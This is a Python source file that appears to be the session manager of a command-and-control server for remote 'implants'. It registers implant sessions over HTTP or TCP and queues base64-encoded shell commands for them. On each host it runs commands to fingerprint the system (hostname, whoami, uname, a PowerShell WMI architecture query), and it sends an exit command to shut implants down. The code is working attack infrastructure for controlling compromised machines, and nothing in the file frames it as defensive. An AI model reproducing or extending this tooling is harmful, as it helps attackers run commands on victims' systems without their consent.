import queue
import base64

class Session:
    def __init__(self, sid, transport, handler):
        self.sid = sid
        self.transport = transport
        self.handler = handler
        self.command_queue = queue.Queue()
        self.output_queue = queue.Queue()
        self.metadata = {}
        self.metadata_stage = 0
        #self.metadata_fields = ["hostname", "user", "os", "arch"]
        self.mode = "detect_os"
        self.os_metadata_commands = []
        self.metadata_fields = []

        # Queue metadata commands immediately on creation:
        self.queue_metadata_commands()

    def queue_metadata_commands(self):
        self.command_queue.put(base64.b64encode(b"uname -a").decode())

        """self.command_queue.put(base64.b64encode(b"hostname").decode())
        self.command_queue.put(base64.b64encode(b"whoami").decode())
        self.command_queue.put(base64.b64encode(b"cmd.exe /c ver").decode())
        self.command_queue.put(base64.b64encode(
    b'powershell.exe -Command "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)"'
).decode())"""

    def detect_os(self, output: str):
        lower = output.lower()

        if "linux" in lower or "darwin" in lower:
            self.metadata["os"] = "Linux"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                ("os", "uname"),
                ("arch", "uname -m")
            ]
        else:
            self.metadata["os"] = "Windows"
            self.metadata_fields = ["hostname", "user", "os", "arch"]
            self.os_metadata_commands = [
                ("hostname", "hostname"),
                ("user", "whoami"),
                ("os", "((cmd.exe /c ver) | Select-String -Pattern 'Windows').Matches.Value"),
                ("arch", 'powershell.exe -Command "(Get-WmiObject Win32_OperatingSystem | Select-Object -ExpandProperty OSArchitecture)"')
            ]

# Global sessions dictionary
sessions = {}
alias_map: dict[str,str] = {}
dead_sessions: set[str] = set()

def kill_http_session(sid: str) -> bool:
    sess = sessions.pop(sid, None)
    if not sess:
        return False
 
    # tell the implant to shut down on its next poll
    sess.command_queue.put(base64.b64encode(b"exit").decode())

    # remember we killed it, so we never re-register it
    dead_sessions.add(sid)
 
    # clean up any aliases pointing to it
    for alias, real in list(alias_map.items()):
        if real == sid:
            del alias_map[alias]
    return True

def set_alias(alias: str, sid: str):
    """Point alias → real SID."""
    alias_map[alias] = sid

def resolve_sid(name: str) -> str|None:
    """Turn either a real SID or an alias into the real SID."""
    if name in sessions:
        return name
    return alias_map.get(name)

def register_http_session(sid):
    sessions[sid] = Session(sid, 'http', queue.Queue())

def register_tcp_session(sid, client_socket):
    sessions[sid] = Session(sid, 'tcp', client_socket)

def is_http_session(sid):
    return sessions[sid].transport == 'http'

def is_tcp_session(sid):
    return sessions[sid].transport == 'tcp'